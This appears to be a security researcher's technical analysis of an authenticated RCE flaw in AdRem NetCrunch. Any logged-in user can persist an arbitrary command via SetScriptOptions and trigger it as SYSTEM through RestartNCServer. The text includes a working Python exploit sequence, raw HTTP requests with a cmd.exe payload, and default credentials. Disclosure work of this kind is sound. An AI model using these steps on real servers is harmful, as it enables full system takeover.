# AdRem NetCrunch Startup Script RCE - Technical Analysis

## Overview

AdRem NetCrunch v16.0.0.8397 RC's `INcStartupScript.SetScriptOptions` RPC interface lets an authenticated user persist an arbitrary executable path plus command-line arguments to the registry (StartupScript.Cmd/Parameters/WaitFor/Timeout), then `INetCrunchServer.RestartNCServer` triggers an NCServer service restart whose Initializing phase runs `TStartupScriptExecutor.ExecuteScript` to execute the persisted cmd+params. NCServerSvc runs as LocalSystem, so this is SYSTEM-privilege arbitrary code execution. The interface is designed as a "startup script" feature (admins configure a script to run when the service starts), but it has **no command allowlist / path validation**, so any authenticated user can set an arbitrary command (e.g. `cmd.exe /c <payload>`), and `RestartNCServer` is a pure RPC method that triggers the restart-execution without needing shell / service-management privileges.

## Stage 0: Authentication Boundary

Same as the session-hijack vuln Stage 0. Authentication is entirely in the Delphi backend NCServer.exe; the Node layer is a thin proxy. This vuln is on the authenticated path and requires valid login credentials.

**Credential acquisition**: `nccli.exe reset-admin-password` (`C:\Program Files\AdRem\NetCrunch\Server\16.0.0\nccli.exe`) resets the admin password to a random value; each reset generates a new random password and prints `Admin password set to: <PW>`. Login succeeds (Code:0, valid Token); MustChangePassword does not block RPC login. In a real attack the default credentials `admin`/`+` are usable in the factory state.

## Stage 1: Sink Identification

### INcStartupScript interface

Found via `api.json` interface enumeration:
- `SetScriptOptions(options)` — persist the startup-script config
- `GetScriptOptions()` — read the current config
- `ExecuteScript()` — execute immediately (observed to return null and not execute; only runs on restart)

### Registry persistence

`SetScriptOptions` writes to the registry `HKLM\...\NetCrunch\Server\16.0.0\StartupScript`:
- `Cmd` — executable path
- `Parameters` — command-line arguments
- `WaitFor` — whether to wait for completion
- `Timeout` — timeout in seconds

**Key**: the field names are **lowercase** `cmd`/`params`/`wait`/`timeout` (not the Delphi class field names). Correct packet:

```json
{"cmd":"C:\\Windows\\System32\\cmd.exe","params":"/c echo RCE > C:\\marker.txt","wait":true,"timeout":30}
```

### TStartupScriptExecutor.ExecuteScript

NCServer's restart **Initializing phase** calls `TStartupScriptExecutor.ExecuteScript`, which reads the registry StartupScript.Cmd + Parameters and executes `cmd.exe /c <params>`. The `ExecuteScript` RPC method itself returns null and does not execute immediately — execution is only triggered at service start.

## Stage 2: Source Identification

### RestartNCServer trigger source

`INetCrunchServer.RestartNCServer([])` (a no-argument RPC method) triggers an NCServer service restart. This is a pure RPC method and needs no shell / service-management privileges (no `sc stop` / `net stop` / admin shell needed); an authenticated user triggers the service restart through an RPC call.

### SetScriptOptions input source

The `options` parameter of `SetScriptOptions` is fully user-controlled (the four fields cmd/params/wait/timeout), with no command allowlist, no path validation, no argument filtering.

## Stage 3: Data Flow

```
Authenticated user (admin or normal user)
    | 1. SetScriptOptions([{cmd, params, wait, timeout}])
    |    options fully user-controlled, no validation
    v
NCServer.exe (Delphi)
    | write registry StartupScript.Cmd/Parameters/WaitFor/Timeout
    v
    | 2. RestartNCServer([])
    |    pure RPC triggers service restart (no shell / service-mgmt privileges)
    v
NCServer service restart -> Initializing phase
    | TStartupScriptExecutor.ExecuteScript
    | read registry StartupScript.Cmd + Parameters
    | execute cmd.exe /c <params>
    v
SYSTEM-privilege arbitrary command execution (NCServerSvc = LocalSystem)
```

## Stage 4: Exploit Construction

```python
# 1. log in to acquire the authenticated state
rpc(sid_gid, "client.session", "Security", "LoginEx", ["web", "admin", pw])

# 2. write the malicious startup script (lowercase field names)
opts = {"cmd": r"C:\Windows\System32\cmd.exe",
        "params": "/c echo NC_FULL_RCE_SUCCESS > C:\\Windows\\Temp\\nc_rce_full.txt",
        "wait": True, "timeout": 30}
rpc(sid_gid, "ncsrv", "INcStartupScript", "SetScriptOptions", [opts])

# 3. trigger the restart execution
rpc(sid_gid, "ncsrv", "INetCrunchServer", "RestartNCServer", [])

# 4. wait 30s, check the marker
# -> C:\Windows\Temp\nc_rce_full.txt content "NC_FULL_RCE_SUCCESS"
```

## Stage 5: Dynamic Verification

### Real HTTP request + response

**Login**:

```http
POST /nc/console/rpc?api=client.session
x-sid: <sid>@<gid>
[{"action":"Security","method":"LoginEx","tid":1,"data":["web","admin","<reset_pw>"]}]
-> 200 [{"result":{"Token":"..."}}]
```

**SetScriptOptions**:

```http
POST /nc/console/rpc?api=ncsrv
x-sid: <sid>@<gid>
[{"action":"INcStartupScript","method":"SetScriptOptions","tid":1,"data":[{"cmd":"C:\\Windows\\System32\\cmd.exe","params":"/c echo NC_FULL_RCE_SUCCESS > C:\\Windows\\Temp\\nc_rce_full.txt","wait":true,"timeout":30}]}]
-> 200 [{"tid":1,"result":null}]
```

**RestartNCServer**:

```http
POST /nc/console/rpc?api=ncsrv
x-sid: <sid>@<gid>
[{"action":"INetCrunchServer","method":"RestartNCServer","tid":1,"data":[]}]
-> 200 [{"tid":1,"result":null}]
```

### Result evidence

After waiting 30s, check the marker:

```
marker: C:\Windows\Temp\nc_rce_full.txt
NC_FULL_RCE_SUCCESS
```

StartupScript.log exit code 0. NCServerSvc runs as LocalSystem -> the command executes with **SYSTEM** privileges.

## Stage 6: Reachability

- **Authenticated reachability**: valid login credentials suffice (admin or normal user)
- **SetScriptOptions**: available by default post-auth, no extra privilege check
- **RestartNCServer**: available by default post-auth, pure RPC trigger (no shell / service-mgmt privileges)
- **Default config**: default install is vulnerable, no special configuration

## Complete Attack Sequence

1. **Authenticate**: log in (via reset-admin-password or default `admin`/`+`) to acquire an authenticated session
2. **Persist malicious startup script**: call `INcStartupScript.SetScriptOptions` with `{cmd, params, wait, timeout}` (lowercase field names) -> writes to the registry
3. **Trigger execution**: call `INetCrunchServer.RestartNCServer` -> the service restarts and the Initializing phase runs the persisted cmd+params
4. **Command executes**: the command runs with SYSTEM privileges (NCServerSvc = LocalSystem)